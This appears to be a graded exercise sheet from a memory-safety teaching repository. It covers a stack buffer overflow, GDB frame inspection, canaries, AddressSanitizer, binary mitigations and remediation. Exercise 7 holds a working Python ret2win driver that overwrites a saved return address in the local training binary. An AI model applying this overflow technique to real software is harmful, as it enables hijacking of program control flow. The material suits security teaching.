# Graded exercises

Complete the exercises in order. They use binaries compiled from this repository and are intended for a disposable local learning environment only. Do not point the techniques at other software.

## Beginner — Exercises 1–3

### 1. Find the unsafe operation

**Goal:** Identify the memory-safety error in the vulnerable program.

**Hints:** Run <code>make vuln</code>, read [src/vulnerable.c](../src/vulnerable.c), and follow the input from <code>main</code> into <code>vulnerable(char *input)</code>. Compare the capacity of <code>buf</code> with the unchecked copy.

**Expected result:** A short explanation identifying the 64-byte destination, the unbounded copy, and why the source length must be checked.

### 2. Inspect the stack frame

**Goal:** Use GDB to identify the local buffer, frame pointer, and saved return-address slot.

**Hints:** Follow [the GDB guide](gdb.md). Run <code>file ./build/vuln</code> first and choose the register names for the architecture it reports. Use <code>print &buf</code>, <code>info frame</code>, and the saved-return-slot address formula.

**Expected result:** A small annotated stack-frame sketch with addresses taken from your own GDB session and the offset calculated from those addresses.

### 3. Compare the safe implementation

**Goal:** Show that benign input works and oversized input is rejected by the safe program.

**Hints:** Run <code>make run-safe</code> with a short line. Then run <code>./build/safe "$(python3 -c 'print("A" * 200)')"</code>.

**Expected result:** Benign input is printed successfully; oversized input produces the length error and a nonzero exit status. Explain why a bounded copy plus a policy check is preferable to silent truncation.

## Intermediate — Exercises 4–6

### 4. Observe a stack canary

**Goal:** Demonstrate detection of a stack overwrite by a canary.

**Hints:** Run <code>make demo-canary</code>. Inspect the imported failure handler with <code>nm -D ./build/canary | grep __stack_chk_fail</code>.

**Expected result:** The program emits a stack-smashing diagnostic and the Make target verifies it. Explain that the canary detects some overwrites at function exit; it does not prevent the invalid write.

### 5. Trigger AddressSanitizer

**Goal:** Reproduce a sanitizer report for a stack-buffer-overflow.

**Hints:** Build with <code>make asan</code>, then run <code>python3 -c 'print("A" * 200)' | ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./build/asan</code>. This intentionally exits unsuccessfully when the sanitizer catches the bug.

**Expected result:** AddressSanitizer reports <code>stack-buffer-overflow</code> and identifies the invalid write in the vulnerable copy. Record the source location and explain the relationship between the report and <code>buf[64]</code>.

### 6. Compare binary mitigations

**Goal:** Inventory canary, ASLR, NX, PIE, RELRO, and FORTIFY for the provided build variants.

**Hints:** Use [the mitigation table](mitigations.md), <code>make all</code>, <code>readelf</code>, <code>nm</code>, and <code>make demo-aslr</code>. Record the actual output from your machine.

**Expected result:** A comparison table with enabled/observed state, evidence command, and a sentence about what each mitigation does not prevent.

## Stretch — Exercises 7–8

### 7. Local ret2win (no shellcode)

**Goal:** In the deliberately non-PIE local binary, redirect the overwritten saved return address to the repository's <code>win()</code> function. This is a **local demonstration** against <code>./build/vuln</code> only; do not add shellcode, target another program, or use a remote service.

**Hints:**
1. Run <code>make vuln</code> and <code>file ./build/vuln</code>.
2. Use [the GDB guide](gdb.md) to derive the offset from <code>&buf</code> to the saved return-address slot. Do not assume a memorized offset.
3. Find the local symbol with <code>nm -n ./build/vuln | grep ' win$'</code> or GDB's <code>info functions win</code>. Read the address from the binary you just built.
4. The following small Python driver shows how to combine the measured offset with that local symbol. Replace only the clearly marked offset value with your GDB result. It sends bytes as an argv string; POSIX argv cannot contain NUL bytes, so it uses only a nonzero low-byte prefix and relies on the saved address's existing high zero bytes. If the current symbol address contains an interior zero byte, do not force this variant; document the limitation instead.

~~~python
import re
import subprocess

binary = "./build/vuln"
offset = int("REPLACE_WITH_OFFSET_DERIVED_IN_GDB")
if offset < 1:
    raise SystemExit("Use the positive offset measured in GDB.")

symbols = subprocess.check_output(["nm", "-n", binary], text=True)
match = re.search(r"^([0-9a-fA-F]+)\s+\w\s+win$", symbols, re.MULTILINE)
if not match:
    raise SystemExit("The local win symbol was not found.")

win_address = int(match.group(1), 16)
file_description = subprocess.check_output(["file", binary], text=True)
pointer_size = 8 if "ELF 64-bit" in file_description else 4
address_bytes = win_address.to_bytes(pointer_size, byteorder="little")
address_prefix = address_bytes.rstrip(b"\x00")

if not address_prefix or b"\x00" in address_prefix:
    raise SystemExit("This symbol address is not representable by the argv/strcpy partial-overwrite variant.")

payload = b"A" * offset + address_prefix
result = subprocess.run([binary.encode(), payload], check=False)
if result.returncode != 0:
    print("The process did not exit normally; check the architecture, measured offset, and GDB observations.")
~~~

**Expected result:** The program prints <code>[+] WIN: local ret2win demonstration reached win()!</code>. Explain why the address was derived from the local symbol table, why the offset came from the current stack frame, and why this demonstration does not need executable payload bytes. If alignment or address-byte constraints prevent this exact variant in your environment, submit the GDB evidence and explain the constraint rather than guessing values.

### 8. Write a mitigation and remediation report

**Goal:** Explain how source repair and layered binary mitigations change the observed result.

**Hints:** Compare <code>./build/vuln</code>, <code>./build/safe</code>, <code>./build/canary</code>, and <code>./build/asan</code>. Refer to [Secure C](secure-c.md) and [Mitigations](mitigations.md).

**Expected result:** A one-page report containing: root cause; sanitizer evidence; before/after source behavior; mitigation observations; residual limitations; and one regression test that would prevent the bug from returning.

## Suggested grading rubric

| Component | Weight |
|---|---:|
| Correct explanation and evidence | 30% |
| Reproducible GDB/sanitizer observations | 25% |
| Correctly derived offsets and addresses | 20% |
| Secure rewrite and mitigation analysis | 15% |
| Clear report and scope discipline | 10% |

The ret2win exercise is intentionally limited to a local function in the training binary. It is not a general-purpose exploit framework.
